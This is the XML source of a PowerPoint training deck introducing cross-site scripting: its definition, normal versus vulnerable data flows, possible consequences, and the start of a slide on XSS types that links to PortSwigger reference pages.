              <a:buNone/>
              <a:defRPr sz="1600" b="1"/>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3658235"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90" y="2014533"/>
            <a:ext cx="5157788" cy="3990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190622"/>
            <a:ext cx="51831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835" indent="0">
              <a:buNone/>
              <a:defRPr sz="1600" b="1"/>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3201035" indent="0">
              <a:buNone/>
              <a:defRPr sz="1600" b="1"/>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3658235"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014533"/>
            <a:ext cx="5183187" cy="3990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1B1BE8B-54F8-4FBC-BCF4-94C5238EEE6F}" type="datetime1">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5BBE350-C792-4A9C-B8D9-9FC0FC3DAF03}"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80ABB0-8E55-48F5-A583-474A1386BA89}" type="datetime1">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0"/>
            <a:ext cx="10380661" cy="871538"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:norm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5183187" y="1309688"/>
            <a:ext cx="6172201" cy="45513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9" y="1317625"/>
            <a:ext cx="3932236" cy="4551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835" indent="0">
              <a:buNone/>
              <a:defRPr sz="1000"/>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3201035" indent="0">
              <a:buNone/>
              <a:defRPr sz="1000"/>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3658235"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E90167C-14A8-4447-9F33-FEC594B17223}"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285750"/>
            <a:ext cx="10399711" cy="614363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="3200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Picture Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5183187" y="1149351"/>
            <a:ext cx="6172201" cy="4711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835" indent="0">
              <a:buNone/>
              <a:defRPr sz="2000"/>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3201035" indent="0">
              <a:buNone/>
              <a:defRPr sz="2000"/>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3658235" indent="0">
              <a:buNone/>
              <a:defRPr sz="2000"/>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="839789" y="1157288"/>
            <a:ext cx="3932236" cy="47117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835" indent="0">
              <a:buNone/>
              <a:defRPr sz="1000"/>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3201035" indent="0">
              <a:buNone/>
              <a:defRPr sz="1000"/>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3658235"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E6FB62F-CF35-47AE-ADF5-F8C5AF925A89}"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F06839-4DD9-4710-A999-7568D84A0BDF}"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3" y="365125"/>
            <a:ext cx="2628899"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1"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0FE0B3-516B-4050-988B-007AED124578}"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C84146-E65B-4948-A521-8AE14AC0265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rcRect l="35222" t="35220"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="19018"/>
            <a:ext cx="12192000" cy="6857465"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Graphic 11"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip>
            <a:extLst>
              <a:ext uri="{96DAC541-7B7A-43D3-8B79-37D633B846F1}">
                <asvg:svgBlip xmlns:asvg="http://schemas.microsoft.com/office/drawing/2016/SVG/main" r:embed="rId14"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:srcRect r="77077"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="11248169" y="19018"/>
            <a:ext cx="673100" cy="919228"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="449690" y="957263"/>
            <a:ext cx="11292619" cy="5474818"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9331"/>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2" name="Title Placeholder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="238125"/>
            <a:ext cx="10444163" cy="71913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userDrawn="1">
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1243013"/>
            <a:ext cx="10515601" cy="49339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userDrawn="1">
            <p:ph type="dt" sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="64849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629986-D41B-479B-8063-D12A742A232B}" type="datetime1">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/8/2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="ftr" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4038602" y="6484951"/>
            <a:ext cx="4114801"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userDrawn="1">
            <p:ph type="sldNum" sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8610602" y="64849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C84146-E65B-4948-A521-8AE14AC02658}"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52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hyperlink" Target="https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-script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115556" y="0"/>
            <a:ext cx="12307556" cy="6925679"/>
            <a:chOff x="-115556" y="-1"/>
            <a:chExt cx="12307556" cy="6925679"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="15" name="Picture 3" descr="C:\Users\vasim\Desktop\ppt\SV PPT.png"/>
            <p:cNvPicPr>
              <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
            </p:cNvPicPr>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId3">
              <a:extLst>
                <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                  <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                </a:ext>
              </a:extLst>
            </a:blip>
            <a:srcRect l="47855" t="40791" r="41050" b="31445"/>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7026729" y="-1"/>
              <a:ext cx="5165271" cy="6925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9"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="-115556" y="0"/>
              <a:ext cx="7256444" cy="6925678"/>
              <a:chOff x="-21189" y="13252"/>
              <a:chExt cx="7187198" cy="6859588"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="2050" name="Picture 3" descr="C:\Users\vasim\Desktop\ppt\SV PPT.png"/>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill rotWithShape="1">
              <a:blip r:embed="rId3">
                <a:extLst>
                  <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                    <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                  </a:ext>
                </a:extLst>
              </a:blip>
              <a:srcRect r="41050"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="-21189" y="13252"/>
                <a:ext cx="7187198"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descr="C:\Users\vasim\Desktop\ppt\SV PPT.png"/>
              <p:cNvPicPr>
                <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
              </p:cNvPicPr>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill rotWithShape="1">
              <a:blip r:embed="rId3">
                <a:extLst>
                  <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                    <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                  </a:ext>
                </a:extLst>
              </a:blip>
              <a:srcRect l="48539" t="33621" r="41050" b="61032"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="5896708" y="2582425"/>
                <a:ext cx="1269301" cy="366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4" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4465320" y="635"/>
            <a:ext cx="7411085" cy="1942465"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91441" tIns="45719" rIns="91441" bIns="45719"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3600" b="1" dirty="0">
                <a:latin typeface="Aptos Display" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" charset="0"/>
              </a:rPr>
              <a:t>Cross Site Scripting (XSS)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Graphic 1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38561" y="5424480"/>
            <a:ext cx="3037753" cy="950948"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:innerShdw blurRad="63500" dist="50800" dir="13500000">
              <a:prstClr val="black">
                <a:alpha val="50000"/>
              </a:prstClr>
            </a:innerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5568950" y="2093595"/>
            <a:ext cx="6297295" cy="1721485"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91441" tIns="45719" rIns="91441" bIns="45719"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lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="6000" b="1" dirty="0">
              <a:cs typeface="Calibri" panose="020F0502020204030204" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="20" name="Straight Connector 19"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6425656" y="2042403"/>
            <a:ext cx="5388428" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2">
            <a:schemeClr val="accent2"/>
          </a:lnRef>
          <a:fillRef idx="0">
            <a:schemeClr val="accent2"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent2"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="tx1"/>
          </a:fontRef>
        </p:style>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8936355" y="3782695"/>
            <a:ext cx="3356610" cy="947420"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91441" tIns="45719" rIns="91441" bIns="45719"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60000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Avinash Verma </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>avinash.v@techdefence.com </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6000" b="1" dirty="0">
              <a:cs typeface="Calibri" panose="020F0502020204030204" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6247130" y="3782695"/>
            <a:ext cx="2588260" cy="947420"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91441" tIns="45719" rIns="91441" bIns="45719"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lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Created by:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Email Address: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6000" b="1" dirty="0">
              <a:cs typeface="Calibri" panose="020F0502020204030204" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="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Cross-Site Scripting (XSS) is a web application security vulnerability that allows an attacker to inject malicious client-side scripts, typically JavaScript, into web pages viewed by other users. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>When the victim accesses the vulnerable web page, the malicious script executes in the victim's browser with the same permissions as the legitimate website. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>XSS is one of the most common and dangerous web application vulnerabilities because it can lead to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>session hijacking, account takeover, credential theft, website defacement, phishing attacks, and unauthorized actions performed on behalf of users.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-GB" sz="5400" b="1" dirty="0"/>
              <a:t>Cross site Scripting</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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2C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E188BC92-F448-6CBD-D514-F450BB258740}"/>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65773070-55A8-8CD8-2858-B9380BD88E19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="7924"/>
            <a:ext cx="12192000" cy="68421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2C84146-E65B-4948-A521-8AE14AC02658}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>4</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18F09050-5A36-26BC-7815-469CFB1E71DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Picture 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{798918A3-49E8-8A0F-DF09-BB8AF0B2B591}"/>
              </a:ext>
            </a:extLst>
          </p:cNvP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Web applications often accept user input through forms, URLs, comments, search fields, profile pages, and other mechanisms. If the application fails to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FF0000"/>
                </a:highlight>
              </a:rPr>
              <a:t>properly validate, sanitize, or encode this input before displaying it in a web page, an attacker may inject malicious code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Normal Flow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>User submits data. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Server processes the data. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data is displayed on a webpage. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Browser renders the content safely. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Vulnerable Flow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attacker submits malicious JavaScript. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Application stores or reflects the malicious input. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Victim accesses the affected page. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Browser executes the attacker's script. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attacker steals data or performs malicious actions. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="5400" b="1" dirty="0"/>
              <a:t>How XSS Works</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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Since the script executes in the victim's browser under the trusted website's security context, it can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Steal session cookies </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Capture login credentials </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Read sensitive information </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Modify webpage content </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Redirect users to malicious sites </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Install malware </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Perform actions on behalf of users </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Conduct phishing attacks </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Access browser storage data </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Title 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-GB" sz="5400" b="1" dirty="0"/>
              <a:t>What can XSS cause?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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ACE7CAA7-9B8D-542F-8178-2F00F96B0093}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1853535962"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="838200" y="1243013"/>
          <a:ext cx="10515601" cy="4933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p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-GB" sz="5400" b="1" dirty="0"/>
              <a:t>Types Of XSS </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{02C84146-E65B-4948-A521-8AE14AC02658}"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E1A41A-D356-BDA6-05AF-C9C82B6225DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Reflected XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, where the malicious script comes from the current HTTP request.</a:t>
            </a:r>
          </a:p>
          <a:p>
